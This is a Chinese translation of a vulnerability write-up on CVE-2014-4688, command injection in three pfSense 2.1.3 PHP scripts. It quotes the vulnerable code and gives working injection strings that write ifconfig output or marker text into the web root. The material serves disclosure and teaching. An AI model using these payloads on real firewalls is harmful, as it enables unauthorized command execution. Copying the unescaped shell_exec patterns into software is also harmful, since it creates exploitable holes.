# PfSense命令注入漏洞分析

翻译：mssp299

原文地址：[https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/](https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/)

0x00 导言
=======

* * *

在本文中，我们将向大家介绍在`PfSense`的`2.1.3`以及更低版本中的`CVE-2014-4688`漏洞；对于更高的版本来说，`pfSense`已经修复了这个漏洞。

0x01 Diag_dns.php脚本中的命令注入漏洞
===========================

* * *

下面展示的是脚本`diag_dns.php`中存在命令注入漏洞的代码片。我们可以看到，这段代码首先检查`POST`参数`host`是否存在，如果存在的话，就将变量`$GET`的值赋给变量`$POST`。然后，代码继续检查`GET`参数`createalias`的值是否等于`true`，如果是的话，则把POST参数host的值的首尾空白符去掉`：trim()`函数的作用就是去掉字符串首尾处的空白符，但是字符串中间部分的空白符则保持不变。之后，还有一些其他语句，不过它们并不是我们这里关注的重点，我们关心的是如何插入在反引号中运行的命令。

```
/* Cheap hack to support both $_GET and $_POST */
if ($_GET['host'])
$_POST = $_GET;

if($_GET['createalias'] == "true") {
$host = trim($_POST['host']);
if($_GET['override'])
$override = true;
$a_aliases = &$config['aliases']['alias'];
$type = "hostname";
$resolved = gethostbyname($host);
if($resolved) {
$host = trim($_POST['host']);
$dig=`dig "$host" A | grep "$host" | grep -v ";" | awk '{ print 5 }'`;

```

由于我们可以直接操纵变量`$host`的值，因此，我们完全可以在注入代码的反引号中插入我们想要执行的命令。下面，我们输入以下内容，让它作为`POST`变量`host`的输入值：

```
192.168.1.1";ifconfig>/usr/local/www/temp.txt;echo+"

```

下面展示的是含有上述输入字符串的HTTP请求，具体如图所示。

![enter image description here](http://drops.javaweb.org/uploads/images/754aff2b71942a9808f25a651da32fdc6404ad31.jpg)

图1 发送给服务器的恶意请求

当上面所示的请求被执行时，`Web`浏览器会显示如下所示的内容，其中含有一个错误信息，出错原因是没有提供有效的主机名。

![enter image description here](http://drops.javaweb.org/uploads/images/bb4d72312b3b835e2fe65e6d1ce3c4ced7eb8423.jpg)

图2 错误消息：`invalid hostname`

我们已经在用户提供的`POST`参数`host`放入了一个特殊字符;，这个字符的作用是分隔多个顺序执行的命令。需要注意的是这种情况下，只有当第一条命令返回``（成功返回）的时候，第二条命令才会被执行；因此，只有确保前面的命令全部成功，后面的命令才能得以执行。下面给出一些可以放在反引号中执行的命令：

```
# dig "192.168.1.1";
# ifconfig>/usr/local/www/temp.txt;
# echo+"" A | grep "192.168.1.1";
# ifconfig>/usr/local/www/temp.txt;
# echo+"" | grep -v ";" | awk '{ print $5 }'

```

我们会看到，每条命令都会正确执行，其中最重要的命令就是`ifconfig`了，它已经被注入到了获得输出内容的脚本中了。由于我们无法直接通过响应报文获得这些命令的输出结果，所以必须通过管道命令将其输出到`DocumentRoot`下的一个文件中，然后才能通过`Web`浏览器正常访问。下面展示的是[https://pfsense/temp.txt](https://pfsense/temp.txt)中的部分请求内容。

![enter image description here](http://drops.javaweb.org/uploads/images/968f628456f47a030418a6731ed06969464e5091.jpg)

图3 生成的`temp.txt`文件

前面，我们已经成功地注入了`ifconfig`命令并得到了其输出结果，实际上这就意味着我们可以向`diag_dns.php`脚本输入任意命令并能得到其输出结果。

因此，攻击者可以注入精心构造的命令，并使其在服务器上面执行。

0x02 Diag_smart.php脚本中的命令注入
===========================

* * *

在`diag_smart.php`脚本中，含有一个名为`update_email`的函数，代码如下所示。这个函数的作用是编辑`smartd.conf`文件，来添加或删除通知磁盘出错情况的电子邮件地址。从下面的代码可以看到，这个函数带有一个名为`smartmonemail`的`POST`参数。需要注意的是，这个函数会调用`sed`命令，并将参数`unescaped`直接传递给`shell_exec`函数。

```
 function update_email($email)
  {
  // Did they pass an email?
  if(!empty($email))
  {
  // Put it in the smartd.conf file
  shell_exec("/usr/bin/sed -i old 's/^DEVICESCAN.*/DEVICESCAN -H -m "
 $email . "/' /usr/local/etc/smartd.conf");
  }
  // Nope
  Else
  {
  // Remove email flags in smartd.conf
  shell_exec("/usr/bin/sed -i old 's/^DEVICESCAN.*/DEVICESCAN/'
usr/local/etc/smartd.conf");
  }
  }
  if($_POST['email'])
  {
  // Write the changes to the smartd.conf file
  update_email($_POST['smartmonemail']);
  }

```

实际上，上面的代码存在一个漏洞，允许我们向`shell_exec`函数注入任意命令，并执行之。下面的请求为我们展示了一个命令注入示例，它将"`Command Injection`"反射到`/var/local/www/cmd.txt`文件中。

当`shell_exec`函数执行时，实际上下列命令也会随之执行。

```
# /usr/bin/sed -i old 's/^DEVICESCAN.*/DEVICESCAN -H -m ejan/'+/usr/local/etc/lynx.cfg;
# echo+"Command+Injection">/usr/local/www/cmd.txt;
# echo+' /' /usr/local/etc/smartd.conf;

```

在上面的命令中，第一条和第三条命令只是配角，中间那条命令才是我们想要注入的主角。实际上，我们可以利用`shell_exec`函数注入任意命令。如果使用浏览器访问[https://pfsense/cmd.txt](https://pfsense/cmd.txt)就会发现，这个字符串实际上已经被保存到`DocumentRoot`下的相应文件中了。

![enter image description here](http://drops.javaweb.org/uploads/images/6bdf328ebf801cbf14f95090d43aad85e0a28b3a.jpg)

图4 生成的`cmd.txt`文件

换句话说，攻击者可以注入任意命令，并使其在服务器上面执行。

0x03 Status_rrd_graph_img.php脚本中的命令注入漏洞
=======================================

* * *

在`status_rrd_graph_img.php`脚本中也存在命令注入漏洞，这主要是由于`exec()`函数的调用方式引起的，下面是与此漏洞有关的部分代码。

```
if ($_GET['database']) {
  $curdatabase = basename($_GET['database']);
  } else {
  $curdatabase = "wan-traffic.rrd";
  }


 if(strstr($curdatabase, "queues")) {
  log_error(sprintf(gettext("failed to create graph from %s%s,
emoving database"),$rrddbpath,$curdatabase));
  exec("/bin/rm -f $rrddbpath$curif$queues");
  Flush();
  Usleep(500);
  enable_rrd_graphing();
  }
  if(strstr($curdatabase, "queuesdrop")) {
  log_error(sprintf(gettext("failed to create graph from %s%s,
emoving database"),$rrddbpath,$curdatabase));
  exec("/bin/rm -f $rrddbpath$curdatabase");
  Flush();
  Usleep(500);
  enable_rrd_graphing();
  }

```

在上述代码的开头部分，会根据`GET`参数`database`的设置情况来调用`basename`函数：如果设置了该参数，则利用它来调用`basename`函数；否则就被设为静态字符串`wan-traffic.rrd`。由于我们想要将代码注入到这个脚本中，所以，我们必须将这个参数设为某个值，因为我们必须这样做才能绕过`basename`函数。此外，`basename`函数需要一个文件路径作为其参数，其返回值为路径中的文件名部分（不包括扩展名），需要说明的是在`Linux /BSD（pfSense）`中使用正斜杠/来作为路径分隔符。因此，这个函数返回的内容基本上就是最后一个正斜杠/后面的字符串，这一点在注入参数值时必须考虑到，因为最后一个正斜杠前面的内容都会被删去。 因此，我们可以向`GET`参数`database`中注入任意字符，但是正斜杠除外。需要注意的是，我们可以向上面代码中的任何一个`exec()`语句注入命令，这主要取决于利用`GET`参数`databage`传递的字符串——就本例来说，我们使用的是第二个`exec()`函数调用，因为它要更简单一些。 当上面的底部代码被执行的时候，下列命令也会随之执行。

```
# /bin/rm -f /var/db/rrd/$curdatabase;

```

我们可以在这个命令的尾部添加字符;，以便插入其他在`rm`命令运行结束以后需要执行的命令。需要说明的是，如果我们使用了命令分隔符;的话，那么只有当`rm`命令已经成功执行完成之后，后插入的命令才会被执行。如果我们并不关心`rm`命令的执行结果的话，我们可以使用`&&`来分隔命令。需要说明的是，我们无法向任意目录中`echo`文本，因为这里不允许使用正斜杠。为了克服这个问题，我们可以先通过`cd`命令进入预定目录，然后通过命令管道实现文本传输的目的。首先，我们必须搞清楚被执行代码的当前目录，这里为`/var/db/rrd/directory`。下面的请求展示了我们是如何执行`queues;echo+"CMD+INJECT">cmd.txt`命令的。

![enter image description here](http://drops.javaweb.org/uploads/images/d7a0e479087b7f5a3407aaff517c42a748263a60.jpg)

图5 执行`echo`命令的请求

由于当前目录是`/var/db/rrd/`，因此，这里创建的`cmd.txt`文件的内容为`CMD INJECT`，这可以通过显示该文件的内容来加以检验。

```
# cat /var/db/rrd/cmd.txt CMD INJECT

```

为了在`PfSense`安装路径下的`DocumentRoot`中生成同样的文件，我们可以通过三个`cd ..`命令返回上层目录，然后切换至`/usr/local/www/ directory`目录，并从这里执行`echo`命令。这样就能够在`/usr/local/www/cmd.txt`路径生成`cmd.txt`文件了。

![enter image description here](http://drops.javaweb.org/uploads/images/954c9c2e61bedd138a4b85b0a0363a81aa39a344.jpg)

图6 执行`echo`命令的请求

由于我们当前位于`PfSense Web`应用的`DocumentRoot`目录中，所以只要在浏览器中请求`cmd.txt`，就能知道是否收到了输出`CMD INJECT`了。

![enter image description here](http://drops.javaweb.org/uploads/images/2950f75b3bd135c1c41785261462df3f680894a4.jpg)

图7 生成的`cmd.txt`文件

这个漏洞允许我们在`PfSense`服务器上执行任意的代码，因此最终会导致这个防火墙形同虚设。 换句话说，攻击者可以注入任意命令，并使其在服务器上面执行。

0x04 小结
=======

* * *

本文详细分析了我们在PfSense中发现的一些命令注入漏洞，希望对读者朋友们有所帮助。